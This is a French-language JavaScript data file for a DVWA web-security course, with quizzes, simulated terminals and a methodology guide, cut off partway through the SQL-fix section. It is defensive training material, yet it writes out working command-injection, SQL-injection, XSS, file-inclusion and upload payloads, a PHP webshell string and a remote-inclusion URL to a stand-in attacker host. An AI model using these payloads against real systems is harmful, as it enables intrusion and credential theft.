/* =============================================================
   Sécurité des applications web — DVWA
   -------------------------------------------------------------
   DVWA (Damn Vulnerable Web Application) est une application PHP/MySQL
   volontairement vulnérable, faite pour s'entraîner EN LOCAL, sur sa
   propre machine (souvent un conteneur). Chaque module expose une faille
   à quatre niveaux de sécurité : low, medium, high, impossible.

   Ce cours reprend les failles classiques du cours de sécurité web :
   injection de commandes, injection SQL (dont aveugle), XSS, inclusion
   de fichiers, upload et CSRF. Pour CHAQUE faille : comment elle marche,
   le payload, ce qui change d'un niveau à l'autre, et surtout LA
   CORRECTION (le niveau « impossible » de DVWA).

   Deux guides (méthodologie + fiche technique des payloads) et quatre
   chapitres (bases, injection de commandes, injection SQL, autres
   failles) avec QCM, jeu de rapidité et terminaux d'exploitation simulés.

   NB : l'exemple de webshell est écrit en fragments concaténés
   (WEBSHELL) pour éviter un faux positif antivirus sur le code source ;
   la chaîne affichée à l'écran reste identique.

   Contenu de sécurité défensive / pentest en environnement de
   laboratoire autorisé. Structure des données : voir data/cours/_modele.js
   ============================================================= */

(function () {

  // Exemple de webshell reconstruit à l'affichage (voir NB en tête de fichier).
  const WEBSHELL = "<?php " + "system($_" + "GET['cmd']); ?>";

  /* =========================================================
     BANQUE — QCM : notions communes (avant les failles)
     ========================================================= */
  const notions = [
    {
      enonce: "Qu'est-ce que DVWA ?",
      choix: [
        "Une application web volontairement vulnérable, installée en local pour s'entraîner",
        "Un pare-feu applicatif (WAF) open source",
        "Un scanner de vulnérabilités automatique",
        "Un service en ligne d'attaque de sites tiers"
      ],
      reponse: 0,
      explication: "DVWA (Damn Vulnerable Web Application) se déploie sur SA machine (souvent un conteneur) pour pratiquer légalement, jamais contre un site tiers."
    },
    {
      enonce: "À quoi servent les niveaux de sécurité low / medium / high / impossible de DVWA ?",
      choix: [
        "Montrer la même faille avec des protections de plus en plus fortes, jusqu'à la version corrigée",
        "Changer la difficulté du mot de passe d'administration",
        "Chiffrer la base de données",
        "Limiter le nombre de requêtes par seconde"
      ],
      reponse: 0,
      explication: "« impossible » est le code corrigé (requêtes préparées, validation stricte, jetons) : il sert de référence pour apprendre à se défendre."
    },
    {
      enonce: "D'où vient, en une phrase, la plupart des failles d'injection ?",
      choix: [
        "Des données de l'utilisateur mélangées à du code (SQL, shell, HTML) sans séparation",
        "D'un mot de passe administrateur trop court",
        "D'un certificat TLS expiré",
        "D'une version trop récente de PHP"
      ],
      reponse: 0,
      explication: "Injection = l'entrée utilisateur est interprétée comme du code. La parade générale : séparer données et code (requêtes préparées, API sûres, échappement)."
    },
    {
      enonce: "Que signifie « ne jamais faire confiance à l'entrée utilisateur » ?",
      choix: [
        "Toute donnée venant du client doit être validée/échappée côté serveur avant usage",
        "Il faut désactiver JavaScript côté client",
        "Il faut chiffrer le trafic HTTPS",
        "Il faut cacher les messages d'erreur uniquement"
      ],
      reponse: 0,
      explication: "Les contrôles côté client (JavaScript, listes déroulantes) se contournent : la validation qui compte est TOUJOURS côté serveur."
    },
    {
      enonce: "Quel projet recense les grandes catégories de risques des applications web ?",
      choix: ["Le Top 10 de l'OWASP", "Le référentiel CVE", "Le framework MITRE ATT&CK", "La RFC 2616"],
      reponse: 0,
      explication: "L'OWASP Top 10 classe les risques (injection, contrôle d'accès, XSS…). CVE recense des vulnérabilités précises ; ATT&CK décrit des techniques d'attaquants."
    },
    {
      enonce: "Pourquoi un test sur DVWA est-il légal alors qu'attaquer un site tiers ne l'est pas ?",
      choix: [
        "DVWA vous appartient et tourne sur votre machine : vous avez l'autorisation",
        "Parce que les failles de DVWA ne sont pas réelles",
        "Parce que DVWA masque votre adresse IP",
        "Parce que l'attaque reste dans le navigateur"
      ],
      reponse: 0,
      explication: "La légalité tient à l'AUTORISATION. Un test d'intrusion sans périmètre écrit ni accord est un délit, même « pour apprendre »."
    }
  ];

  /* =========================================================
     BANQUE — QCM : injection de commandes (théorie)
     ========================================================= */
  const cmdTheorie = [
    {
      enonce: "Qu'est-ce qu'une injection de commandes (command injection) ?",
      choix: [
        "Faire exécuter des commandes système en injectant dans une entrée passée à un shell",
        "Insérer du SQL dans un formulaire de connexion",
        "Injecter du JavaScript dans une page consultée par la victime",
        "Envoyer trop de requêtes pour saturer le serveur"
      ],
      reponse: 0,
      explication: "L'application construit une commande shell avec l'entrée utilisateur (ex. `ping <ip>`) ; on y greffe sa propre commande."
    },
    {
      enonce: "Dans le module « Command Injection » de DVWA, quelle commande le serveur exécute-t-il avec votre saisie ?",
      choix: ["ping vers l'adresse saisie", "une requête SQL SELECT", "un rendu HTML", "un envoi d'e-mail"],
      reponse: 0,
      explication: "Le champ attend une IP et lance `ping <ip>`. En niveau low, la saisie est concaténée telle quelle dans la commande shell."
    },
    {
      enonce: "Parmi ces caractères, lesquels enchaînent une seconde commande dans un shell Unix ?",
      choix: [
        "`;`  `|`  `&&`  `||`  `&`",
        "`,`  `.`  `:`  `@`",
        "`<`  `>`  `\"`  `'`",
        "`#`  `--`  `/*`"
      ],
      reponse: 0,
      explication: "`;` enchaîne, `|` redirige la sortie, `&&`/`||` enchaînent selon le succès/échec, `&` lance en arrière-plan. Les substitutions `` `cmd` `` et `$(cmd)` marchent aussi."
    },
    {
      enonce: "Que fait l'entrée `127.0.0.1; cat /etc/passwd` en niveau low ?",
      choix: [
        "Elle ping 127.0.0.1 puis affiche le contenu de /etc/passwd",
        "Elle bloque toute injection",
        "Elle envoie une requête SQL",
        "Elle redémarre le serveur web"
      ],
      reponse: 0,
      explication: "Le `;` termine le `ping` ; la commande suivante (`cat /etc/passwd`) s'exécute avec les droits du serveur web."
    },
    {
      enonce: "En niveau medium, DVWA retire `&&` et `;` de la saisie. Comment injecter quand même ?",
      choix: [
        "Utiliser un séparateur non filtré comme `|` ou `&`",
        "Mettre le payload en majuscules",
        "Doubler l'adresse IP",
        "C'est impossible, medium est corrigé"
      ],
      reponse: 0,
      explication: "La liste noire est incomplète : `|` (pipe) et `&` ne sont pas filtrés. `127.0.0.1 | cat /etc/passwd` passe."
    },
    {
      enonce: "En niveau high, la liste noire bloque `';'`, `'&'` et `'| '` (pipe SUIVI d'un espace). Quel détail permet de contourner ?",
      choix: [
        "Coller la commande au pipe, sans espace : `|cat /etc/passwd`",
        "Remplacer le pipe par un point-virgule",
        "Ajouter deux espaces après le pipe",
        "Aucun contournement possible"
      ],
      reponse: 0,
      explication: "La règle filtre `'| '` avec l'espace. `127.0.0.1|cat /etc/passwd` (pipe collé) n'est pas dans la liste : c'est la faille du filtrage par liste noire."
    },
    {
      enonce: "Pourquoi le niveau « impossible » de l'injection de commandes n'est-il pas exploitable ?",
      choix: [
        "L'entrée est découpée en 4 octets vérifiés comme numériques : plus aucun caractère de shell ne passe",
        "Le serveur refuse toute connexion",
        "Le ping est désactivé",
        "La réponse est chiffrée"
      ],
      reponse: 0,
      explication: "On valide par LISTE BLANCHE : l'IP est découpée sur les `.` et chaque octet doit être numérique. Tout le reste est rejeté."
    },
    {
      enonce: "Quelle est la bonne parade contre l'injection de commandes ?",
      choix: [
        "Éviter le shell (API dédiée), sinon valider par liste blanche et échapper (escapeshellarg)",
        "Filtrer uniquement le point-virgule",
        "Passer la commande en HTTPS",
        "Cacher le message d'erreur du shell"
      ],
      reponse: 0,
      explication: "Le mieux est de ne pas appeler de shell. Sinon : liste blanche stricte de la valeur attendue + `escapeshellarg()`. Une liste noire est toujours contournable."
    },
    {
      enonce: "Sous quels droits s'exécute la commande injectée ?",
      choix: [
        "Ceux du serveur web (ex. www-data)",
        "Ceux de root systématiquement",
        "Ceux de l'utilisateur du navigateur",
        "Aucun, elle est simulée"
      ],
      reponse: 0,
      explication: "La commande hérite des droits du processus web. D'où l'intérêt d'exécuter le serveur avec un compte à privilèges réduits (moindre privilège)."
    }
  ];

  /* =========================================================
     BANQUE — QCM : injection SQL (théorie + technique)
     ========================================================= */
  const sqlBanque = [
    {
      enonce: "Qu'est-ce qu'une injection SQL (SQLi) ?",
      choix: [
        "Détourner une requête SQL en injectant du code dans une entrée concaténée à la requête",
        "Exécuter une commande shell via un formulaire",
        "Insérer du HTML dans la page d'un autre utilisateur",
        "Deviner un mot de passe par force brute"
      ],
      reponse: 0,
      explication: "La requête est construite en collant l'entrée utilisateur (`... WHERE id='$id'`). On casse la chaîne pour modifier la logique de la requête."
    },
    {
      enonce: "La requête est `SELECT first_name,last_name FROM users WHERE user_id='$id'`. Que renvoie `$id` = `1' OR '1'='1` ?",
      choix: [
        "Toutes les lignes de la table users",
        "Une seule ligne, l'utilisateur 1",
        "Une erreur de syntaxe systématique",
        "Aucune ligne"
      ],
      reponse: 0,
      explication: "La condition devient toujours vraie (`'1'='1'`) : l'apostrophe ferme la chaîne, `OR '1'='1'` élargit le résultat à tout."
    },
    {
      enonce: "À quoi sert `ORDER BY 3 #` injecté après l'identifiant ?",
      choix: [
        "Trouver le nombre de colonnes de la requête (erreur si la colonne n'existe pas)",
        "Trier les mots de passe",
        "Supprimer la table",
        "Créer un nouvel utilisateur"
      ],
      reponse: 0,
      explication: "On incrémente le numéro jusqu'à l'erreur : la dernière valeur qui fonctionne donne le nombre de colonnes, indispensable avant un UNION."
    },
    {
      enonce: "Pourquoi faut-il autant de colonnes dans `UNION SELECT` que dans la requête d'origine ?",
      choix: [
        "UNION exige le même nombre de colonnes des deux côtés, sinon la requête échoue",
        "Pour trier le résultat",
        "Pour accélérer la requête",
        "Ce n'est pas obligatoire"
      ],
      reponse: 0,
      explication: "`UNION` fusionne deux SELECT : ils doivent avoir le même nombre de colonnes (et des types compatibles). D'où le `ORDER BY` préalable."
    },
    {
      enonce: "Que récupère `1' UNION SELECT user(),version() #` ?",
      choix: [
        "L'utilisateur MySQL courant et la version du serveur",
        "La liste des tables",
        "Les mots de passe hachés",
        "Le code source PHP"
      ],
      reponse: 0,
      explication: "`user()`, `version()`, `database()` sont des fonctions de reconnaissance : on cartographie la base avant d'extraire des données."
    },
    {
      enonce: "Où lister les tables et colonnes d'une base MySQL par injection ?",
      choix: [
        "Dans la base système `information_schema` (tables `.tables` et `.columns`)",
        "Dans la table `users` uniquement",
        "Dans le fichier /etc/passwd",
        "Dans les en-têtes HTTP"
      ],
      reponse: 0,
      explication: "`information_schema.tables` et `information_schema.columns` décrivent tout le schéma : c'est la carte de la base pour cibler l'extraction."
    },
    {
      enonce: "Quel payload extrait les identifiants de la table users ?",
      choix: [
        "`1' UNION SELECT user, password FROM users #`",
        "`1' ORDER BY 99 #`",
        "`1'; ping 127.0.0.1 #`",
        "`<script>alert(1)</script>`"
      ],
      reponse: 0,
      explication: "On sélectionne les colonnes repérées via information_schema. DVWA stocke les mots de passe en MD5 : ils se cassent ensuite hors ligne."
    },
    {
      enonce: "À quoi servent `#` ou `-- ` en fin de payload SQL ?",
      choix: [
        "Commenter la fin de la requête d'origine (l'apostrophe fermante gênante)",
        "Chiffrer la requête",
        "Ouvrir un shell",
        "Trier le résultat"
      ],
      reponse: 0,
      explication: "Le commentaire neutralise ce qui suit dans la requête (souvent une apostrophe ou `LIMIT 1`). Noter l'espace obligatoire après `-- `."
    },
    {
      enonce: "Qu'est-ce qu'une injection SQL AVEUGLE (blind) ?",
      choix: [
        "La page ne montre pas les données, mais on déduit l'info via des réponses vrai/faux ou des délais",
        "Une injection qui ne fonctionne jamais",
        "Une injection uniquement dans les images",
        "Une injection réservée à PostgreSQL"
      ],
      reponse: 0,
      explication: "Sans affichage direct, on pose des questions booléennes (`AND 1=1` vs `AND 1=2`) ou temporelles (`SLEEP`) et on lit la réaction de la page."
    },
    {
      enonce: "Que teste `1' AND SLEEP(5) #` en injection aveugle ?",
      choix: [
        "Si la réponse met ~5 s, l'injection fonctionne (blind temporelle)",
        "Si le serveur redémarre",
        "Si le mot de passe est SLEEP",
        "Le nombre de colonnes"
      ],
      reponse: 0,
      explication: "Le délai observable sert de canal : `IF(condition, SLEEP(5), 0)` permet d'extraire l'information bit à bit sans aucun affichage."
    },
    {
      enonce: "En niveau medium, DVWA échappe les apostrophes et passe l'id via une liste déroulante. Pourquoi reste-ce vulnérable ?",
      choix: [
        "L'id est inséré SANS apostrophes : on injecte en numérique (`1 OR 1=1`) et la liste se contourne (requête forgée)",
        "Le medium est totalement corrigé",
        "Les apostrophes suffisent à tout bloquer",
        "La liste déroulante empêche toute requête"
      ],
      reponse: 0,
      explication: "Échapper les apostrophes ne protège pas un contexte NUMÉRIQUE, et un contrôle côté client (menu) se rejoue à la main (proxy/curl)."
    },
    {
      enonce: "Quelle est LA parade de fond contre l'injection SQL ?",
      choix: [
        "Les requêtes préparées / paramétrées (données envoyées à part du code SQL)",
        "Interdire l'apostrophe uniquement",
        "Renommer la table users",
        "Cacher les erreurs SQL"
      ],
      reponse: 0,
      explication: "Une requête préparée (PDO `prepare` + `bindParam`) sépare définitivement le code des données : l'entrée n'est plus interprétée comme du SQL. C'est le niveau « impossible »."
    },
    {
      enonce: "Pourquoi masquer les messages d'erreur SQL ne suffit-il pas à corriger la faille ?",
      choix: [
        "L'injection aveugle fonctionne sans message d'erreur : il faut corriger la requête, pas cacher l'erreur",
        "Les erreurs sont déjà chiffrées",
        "Cacher l'erreur casse la base",
        "Si, cela suffit"
      ],
      reponse: 0,
      explication: "Masquer l'erreur gêne l'attaquant mais ne ferme rien (blind booléen/temporel). La correction est structurelle : requêtes préparées."
    }
  ];

  /* =========================================================
     BANQUE — QCM : XSS, inclusion, upload, CSRF
     ========================================================= */
  const autresBanque = [
    {
      enonce: "Qu'est-ce qu'une faille XSS (Cross-Site Scripting) ?",
      choix: [
        "Injecter du JavaScript qui s'exécute dans le navigateur d'autres utilisateurs",
        "Exécuter une commande shell sur le serveur",
        "Lire un fichier système du serveur",
        "Saturer le serveur de requêtes"
      ],
      reponse: 0,
      explication: "La XSS s'exécute côté CLIENT : vol de cookie de session, actions au nom de la victime, défiguration. C'est une faille de sortie non échappée."
    },
    {
      enonce: "Différence entre XSS réfléchie et XSS stockée ?",
      choix: [
        "Réfléchie = renvoyée dans la réponse immédiate (lien piégé) ; stockée = enregistrée en base et servie à tous",
        "Réfléchie = côté serveur ; stockée = côté client",
        "Réfléchie = en HTTPS ; stockée = en HTTP",
        "Aucune différence"
      ],
      reponse: 0,
      explication: "La stockée (livre d'or, commentaire) est la plus grave : le payload frappe chaque visiteur. La DOM XSS, elle, naît dans le JavaScript du client."
    },
    {
      enonce: "Payload XSS typique pour prouver l'exécution ?",
      choix: [
        "`<script>alert(document.cookie)</script>`",
        "`1' OR '1'='1`",
        "`; cat /etc/passwd`",
        "`../../../../etc/passwd`"
      ],
      reponse: 0,
      explication: "`alert(document.cookie)` démontre l'accès au cookie de session. En médium, `<script>` filtré se contourne par `<img src=x onerror=alert(1)>` ou `<svg onload=...>`."
    },
    {
      enonce: "Quelle est la parade principale contre la XSS ?",
      choix: [
        "Échapper la SORTIE selon le contexte (htmlspecialchars) et poser une CSP",
        "Chiffrer la base de données",
        "Utiliser des requêtes préparées",
        "Filtrer le point-virgule"
      ],
      reponse: 0,
      explication: "La XSS est un problème de sortie : on encode les caractères HTML à l'affichage. Une Content-Security-Policy limite en plus les scripts exécutables. (Les requêtes préparées, elles, visent le SQL.)"
    },
    {
      enonce: "Qu'est-ce qu'une inclusion de fichier locale (LFI) ?",
      choix: [
        "Forcer l'application à inclure un fichier local via un paramètre (ex. `?page=../../etc/passwd`)",
        "Téléverser un fichier PHP",
        "Injecter du SQL dans un chemin",
        "Envoyer un cookie falsifié"
      ],
      reponse: 0,
      explication: "Le paramètre `page` est passé à `include()` sans contrôle. La traversée `../` remonte l'arborescence ; `php://filter` lit le code source encodé."
    },
    {
      enonce: "Différence entre LFI et RFI ?",
      choix: [
        "LFI inclut un fichier du serveur ; RFI inclut un fichier DISTANT (URL) contrôlé par l'attaquant",
        "LFI est en HTTP, RFI en HTTPS",
        "LFI vise MySQL, RFI vise PHP",
        "Aucune différence"
      ],
      reponse: 0,
      explication: "La RFI (Remote File Inclusion) exécute du code hébergé ailleurs (`?page=http://attaquant/shell.txt`) ; elle exige `allow_url_include` activé, aujourd'hui rare."
    },
    {
      enonce: "En medium, l'inclusion de fichier retire `http://` et `../` de l'entrée. Comment contourner ?",
      choix: [
        "Utiliser des variantes non filtrées : `....//` ou `HtTp://` (remplacement simple, non récursif)",
        "Doubler la taille du fichier",
        "Passer en POST uniquement",
        "C'est incontournable"
      ],
      reponse: 0,
      explication: "`str_replace('../','')` sur `....//` laisse `../` ; la casse contourne `http://`. Encore une liste noire trop naïve."
    },
    {
      enonce: "Quelle est la bonne défense contre l'inclusion de fichier ?",
      choix: [
        "Liste blanche des pages autorisées (n'inclure que des valeurs prévues)",
        "Filtrer le mot 'passwd'",
        "Renommer /etc/passwd",
        "Désactiver le cache"
      ],
      reponse: 0,
      explication: "On mappe une valeur d'entrée vers un fichier autorisé (`switch`/tableau blanc), au lieu de laisser l'utilisateur composer un chemin."
    },
    {
      enonce: "Faille d'upload : quel fichier un attaquant cherche-t-il à téléverser ?",
      choix: [
        "Un webshell (ex. `" + WEBSHELL + "`) exécutable par le serveur",
        "Une image PNG légitime",
        "Un fichier texte vide",
        "Un certificat TLS"
      ],
      reponse: 0,
      explication: "Si le fichier PHP finit dans un dossier servi par le serveur, l'appeler l'exécute : c'est l'exécution de code à distance."
    },
    {
      enonce: "En upload medium, seul le type MIME est vérifié. Contournement ?",
      choix: [
        "Forger l'en-tête `Content-Type: image/jpeg` tout en envoyant un .php (le MIME vient du client)",
        "Compresser le fichier",
        "Renommer la base",
        "Envoyer deux fois le fichier"
      ],
      reponse: 0,
      explication: "Le Content-Type est déclaré par le client : il se falsifie via un proxy. En high, on ajoute une double extension `shell.php.jpg` + octets magiques d'image."
    },
    {
      enonce: "Défenses correctes pour l'upload de fichiers ?",
      choix: [
        "Liste blanche d'extensions, renommage, stockage hors racine web et pas d'exécution du dossier",
        "Vérifier seulement le Content-Type",
        "Autoriser tous les fichiers < 1 Mo",
        "Filtrer uniquement le mot 'shell'"
      ],
      reponse: 0,
      explication: "On combine : extension en liste blanche, contenu vérifié (getimagesize), nom réattribué, dossier non exécutable et hors webroot."
    },
    {
      enonce: "Qu'est-ce qu'une faille CSRF (Cross-Site Request Forgery) ?",
      choix: [
        "Faire exécuter au navigateur d'une victime authentifiée une requête qu'elle n'a pas voulue",
        "Injecter du SQL dans un formulaire",
        "Lire un fichier local du serveur",
        "Deviner un mot de passe"
      ],
      reponse: 0,
      explication: "Le site de l'attaquant déclenche une requête vers un site où la victime est connectée (ex. changer son mot de passe) : le cookie part automatiquement."
    },
    {
      enonce: "Quelle est la parade standard contre la CSRF ?",
      choix: [
        "Un jeton anti-CSRF imprévisible par requête (et SameSite sur le cookie)",
        "Chiffrer la base",
        "Échapper le HTML en sortie",
        "Filtrer le point-virgule"
      ],
      reponse: 0,
      explication: "Le jeton, lié à la session et vérifié côté serveur, ne peut pas être deviné par un site tiers. `SameSite=Lax/Strict` bloque l'envoi automatique du cookie inter-site."
    },
    {
      enonce: "Faille de force brute sur un formulaire de connexion : quel outil et quelle parade ?",
      choix: [
        "Outil : hydra/ffuf ; parade : limitation du débit, verrouillage, MFA, CAPTCHA",
        "Outil : sqlmap ; parade : requêtes préparées",
        "Outil : nmap ; parade : pare-feu",
        "Outil : Responder ; parade : Kerberos"
      ],
      reponse: 0,
      explication: "La force brute teste des milliers de mots de passe (`hydra ... http-post-form`). On la freine par tentatives limitées, temporisation, MFA et CAPTCHA."
    }
  ];

  /* =========================================================
     TERMINAL — Injection de commandes (low → high)
     invite = le champ « ping » de DVWA
     ========================================================= */
  const cmdObjectifs = [
    {
      enonce: "**Niveau low.** Le champ lance `ping <votresaisie>`. Enchaînez une seconde commande pour afficher l'utilisateur du serveur web avec `whoami`.",
      indice: "Un `;` termine le ping, puis votre commande : `127.0.0.1; whoami`",
      motifs: ["[;|&]\\s*whoami"],
      solution: "127.0.0.1; whoami",
      sortie:
"PING 127.0.0.1 (127.0.0.1): 56 data bytes\n" +
"64 bytes from 127.0.0.1: icmp_seq=0 ttl=64 time=0.038 ms\n" +
"www-data"
    },
    {
      enonce: "**Niveau low.** Lisez le fichier des comptes du système, `/etc/passwd`, à la suite du ping.",
      indice: "`127.0.0.1; cat /etc/passwd` — n'importe quel séparateur (`;`, `|`, `&`) convient en low.",
      motifs: ["[;|&]", "cat\\s+/etc/passwd"],
      solution: "127.0.0.1; cat /etc/passwd",
      sortie:
"root:x:0:0:root:/root:/bin/bash\n" +
"www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\n" +
"mysql:x:100:101:MySQL Server:/var/lib/mysql:/bin/false"
    },
    {
      enonce: "**Niveau medium.** Le filtre supprime maintenant `;` et `&&`. Contournez-le avec un séparateur oublié pour relire `/etc/passwd`.",
      indice: "Le pipe `|` n'est pas filtré : `127.0.0.1 | cat /etc/passwd`",
      motifs: ["\\|\\s*cat\\s+/etc/passwd"],
      interdire: [";", "&&"],
      solution: "127.0.0.1 | cat /etc/passwd",
      sortie:
"root:x:0:0:root:/root:/bin/bash\n" +
"www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin"
    },
    {
      enonce: "**Niveau high.** Le filtre bloque `;`, `&` et `'| '` (pipe SUIVI d'un espace). Collez la commande au pipe, sans espace, pour lire `/etc/passwd`.",
      indice: "Pipe collé : `127.0.0.1|cat /etc/passwd` (aucun espace après le `|`).",
      motifs: ["\\|cat\\s+/etc/passwd"],
      interdire: ["\\|\\s", ";", "&"],
      solution: "127.0.0.1|cat /etc/passwd",
      sortie:
"root:x:0:0:root:/root:/bin/bash\n" +
"www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin"
    },
    {
      enonce: "**Objectif final (high).** Récupérez les identifiants de la base : lisez le fichier de configuration `config/config.inc.php` (pipe collé, sans espace).",
      indice: "`127.0.0.1|cat /var/www/html/config/config.inc.php`",
      motifs: ["\\|cat\\s+\\S*config\\S*", "config\\.inc\\.php"],
      interdire: ["\\|\\s", ";", "&"],
      solution: "127.0.0.1|cat /var/www/html/config/config.inc.php",
      sortie:
"$_DVWA[ 'db_user' ]     = 'dvwa';\n" +
"$_DVWA[ 'db_password' ] = 'p@ssw0rd';\n" +
"$_DVWA[ 'db_database' ] = 'dvwa';\n" +
"[+] Identifiants de base de données exposés."
    }
  ];

  /* =========================================================
     TERMINAL — Injection SQL UNION (low)
     invite = le champ « User ID » de DVWA
     ========================================================= */
  const sqlObjectifs = [
    {
      enonce: "La requête est `SELECT first_name,last_name FROM users WHERE user_id='<saisie>'`. Prouvez l'injection : forcez une condition toujours vraie pour tout afficher.",
      indice: "Fermez l'apostrophe puis ajoutez une condition vraie : `1' OR '1'='1`",
      motifs: ["'", "\\bor\\b", "1\\s*=\\s*1|'1'\\s*=\\s*'1"],
      solution: "1' OR '1'='1",
      sortie:
"ID: 1' OR '1'='1\n" +
"First name: admin      Surname: admin\n" +
"First name: Gordon     Surname: Brown\n" +
"First name: Hack       Surname: Me\n" +
"[+] Toutes les lignes renvoyées : injection confirmee."
    },
    {
      enonce: "Trouvez le nombre de colonnes de la requête avec `ORDER BY`. Testez la valeur qui fonctionne encore (la requête en a deux). Terminez par un commentaire.",
      indice: "`1' ORDER BY 2 #` fonctionne, `ORDER BY 3 #` provoque une erreur.",
      motifs: ["order\\s+by\\s+2", "#|--"],
      solution: "1' ORDER BY 2 #",
      sortie:
"ID: 1' ORDER BY 2 #\n" +
"First name: admin      Surname: admin\n" +
"[*] 2 colonnes : ORDER BY 3 renverrait « Unknown column '3' in 'order clause' »."
    },
    {
      enonce: "La requête a 2 colonnes. Affichez vos propres valeurs avec un `UNION SELECT` à deux colonnes.",
      indice: "`1' UNION SELECT 1,2 #`",
      motifs: ["union\\s+select", "1\\s*,\\s*2", "#|--"],
      solution: "1' UNION SELECT 1,2 #",
      sortie:
"ID: 1' UNION SELECT 1,2 #\n" +
"First name: 1      Surname: 2\n" +
"[+] UNION operationnel : les 2 colonnes s'affichent."
    },
    {
      enonce: "Reconnaissez la base : récupérez l'utilisateur MySQL courant et la version du serveur via le UNION.",
      indice: "`1' UNION SELECT user(),version() #`",
      motifs: ["union\\s+select", "user\\s*\\(\\s*\\)", "version\\s*\\(\\s*\\)|@@version", "#|--"],
      solution: "1' UNION SELECT user(),version() #",
      sortie:
"First name: dvwa@localhost\n" +
"Surname: 10.5.23-MariaDB\n" +
"[+] Utilisateur et version de la base identifies."
    },
    {
      enonce: "Cartographiez la base : listez les tables via `information_schema.tables` (colonnes `table_name` et `table_schema`).",
      indice: "`1' UNION SELECT table_name, table_schema FROM information_schema.tables #`",
      motifs: ["union\\s+select", "information_schema\\.tables", "table_name", "#|--"],
      solution: "1' UNION SELECT table_name, table_schema FROM information_schema.tables #",
      sortie:
"First name: guestbook   Surname: dvwa\n" +
"First name: users       Surname: dvwa\n" +
"[+] Table 'users' reperee dans le schema 'dvwa'."
    },
    {
      enonce: "Extrayez les identifiants : sélectionnez les colonnes `user` et `password` de la table `users`.",
      indice: "`1' UNION SELECT user, password FROM users #`",
      motifs: ["union\\s+select", "from\\s+users", "password", "#|--"],
      solution: "1' UNION SELECT user, password FROM users #",
      sortie:
"First name: admin    Surname: 5f4dcc3b5aa765d61d8327deb882cf99\n" +
"First name: gordonb  Surname: e99a18c428cb38d5f260853678922e03\n" +
"[+] Hachages MD5 extraits : a casser ensuite hors ligne."
    },
    {
      enonce: "**Injection aveugle.** Sans affichage, prouvez l'injection par le TEMPS : faites attendre la réponse 5 secondes si la condition est vraie.",
      indice: "`1' AND SLEEP(5) #`",
      motifs: ["\\band\\b", "sleep\\s*\\(\\s*5\\s*\\)", "#|--"],
      solution: "1' AND SLEEP(5) #",
      sortie:
"[*] Reponse recue apres 5,01 s\n" +
"[+] Blind SQLi confirmee : le delai sert de canal (extraction bit a bit possible)."
    }
  ];

  /* =========================================================
     GUIDE 1 — Méthodologie (repérer, exploiter, CORRIGER)
     ========================================================= */
  const guideMethodo = {
    id: "methodo-dvwa",
    titre: "Méthode — repérer, exploiter et corriger une faille DVWA",
    resume: "Pour chaque grande faille : comment la reconnaître, le payload de démonstration, ce qui change selon le niveau low/medium/high, et la correction (le niveau « impossible »).",
    niveau: "Débutant",
    prealables: ["DVWA installé en local (conteneur ou LAMP)", "Notions de HTTP et d'un langage web"],
    sections: [
      {
        type: "notion",
        titre: "Cadre : en local, sur sa propre cible",
        texte: "DVWA s'installe **sur votre machine** pour s'entraîner **légalement**. Les mêmes techniques contre un site tiers sans autorisation écrite sont un délit. Réglez le niveau dans l'onglet **DVWA Security** ; « **impossible** » est le code corrigé, à lire pour apprendre à se défendre.",
        points: [
          "Un seul principe derrière presque tout : **ne jamais mélanger les données de l'utilisateur avec du code** (SQL, shell, HTML).",
          "La règle d'or de défense : **liste blanche** (autoriser ce qui est prévu) plutôt que **liste noire** (interdire quelques caractères), toujours contournable."
        ]
      },

      { type: "partie", titre: "Injection de commandes", texte: "Le champ attend une IP et lance `ping <ip>`. Si la saisie est concaténée dans la commande shell, on greffe la sienne." },
      {
        titre: "Exploiter",
        texte: "On enchaîne une commande avec un **séparateur de shell**. En montant de niveau, DVWA filtre certains séparateurs par **liste noire** — donc incomplète.",
        tableau: {
          entetes: ["Niveau", "Ce qui change", "Payload qui passe"],
          lignes: [
            ["low", "Aucun filtre", "`127.0.0.1; cat /etc/passwd`"],
            ["medium", "`;` et `&&` retirés", "`127.0.0.1 | cat /etc/passwd`"],
            ["high", "`;`, `&`, `'| '` (pipe+espace) retirés", "`127.0.0.1|cat /etc/passwd` (pipe collé)"]
          ]
        },
        remarque: "Séparateurs utiles : `;` `|` `||` `&` `&&`, substitutions `` `cmd` `` et `$(cmd)`."
      },
      {
        titre: "Corriger",
        texte: "Le niveau **impossible** découpe l'IP sur les `.` et vérifie que **chaque octet est numérique** (`is_numeric`) : liste blanche stricte.",
        points: [
          "Le mieux : **ne pas appeler de shell** du tout (utiliser une API/fonction dédiée).",
          "Sinon, valider par liste blanche **et** échapper avec `escapeshellarg()`.",
          "Exécuter le serveur en **moindre privilège** (jamais root)."
        ],
        attention: "Filtrer « seulement le point-virgule » ne sert à rien : il reste `|`, `&`, les backticks, `$( )`…"
      },

      { type: "partie", titre: "Injection SQL", texte: "Requête typique : `... WHERE user_id='$id'`. L'apostrophe casse la chaîne et laisse écrire du SQL." },
      {
        titre: "Exploiter (méthode UNION)",
        texte: "Démarche standard pour extraire des données visibles à l'écran :",
        tableau: {
          entetes: ["Étape", "Payload"],
          lignes: [
            ["1. Confirmer", "`1' OR '1'='1`"],
            ["2. Compter les colonnes", "`1' ORDER BY 2 #`"],
            ["3. Reconnaissance", "`1' UNION SELECT user(),version() #`"],
            ["4. Lister les tables", "`1' UNION SELECT table_name,table_schema FROM information_schema.tables #`"],
            ["5. Extraire", "`1' UNION SELECT user,password FROM users #`"]
          ]
        },
        remarque: "`#` (ou `-- ` avec l'espace) commente la fin de la requête d'origine."
      },
      {
        titre: "Injection aveugle (blind)",
        texte: "Quand rien ne s'affiche, on lit la **réaction** de la page : vrai/faux ou délai.",
        tableau: {
          entetes: ["Type", "Test"],
          lignes: [
            ["Booléenne", "`1' AND 1=1 #` (vrai) vs `1' AND 1=2 #` (faux)"],
            ["Temporelle", "`1' AND SLEEP(5) #` (réponse ralentie = vrai)"]
          ]
        },
        remarque: "En medium, l'id est numérique et sans apostrophe : on injecte `1 OR 1=1` et on rejoue la requête à la main (la liste déroulante est un contrôle côté client)."
      },
      {
        titre: "Corriger",
        texte: "Le niveau **impossible** utilise une **requête préparée** PDO : le code SQL et les données voyagent séparément, l'entrée n'est plus interprétée.",
        code:
"$stmt = $pdo->prepare('SELECT first_name, last_name FROM users WHERE user_id = ?');\n" +
"$stmt->bindParam(1, $id, PDO::PARAM_INT);\n" +
"$stmt->execute();",
